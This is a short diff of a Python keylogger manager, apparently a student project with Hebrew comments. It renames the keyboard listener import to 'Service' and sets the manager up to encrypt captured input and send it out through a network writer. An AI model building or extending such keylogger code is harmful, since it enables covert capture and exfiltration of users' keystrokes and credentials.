@@ -1,4 +1,4 @@
-from keylogger_listener import ListenerKeyboard
+from keylogger_listener import Service
 from encrypt import Encryption
 from file_writer import FileWriter
 import time
@@ -11,7 +11,7 @@ from network_writer import NetworkSaver
 class KeyloggerManager:
 
     def __init__(self,key):         #בעת יצירת מופע יש להכניס מפתח הצפנה
-        self.keylogger_listener = ListenerKeyboard()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
+        self.keylogger_listener = Service()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
         self.buffer = {}
         self.key = key
         self.writer = NetworkSaver()
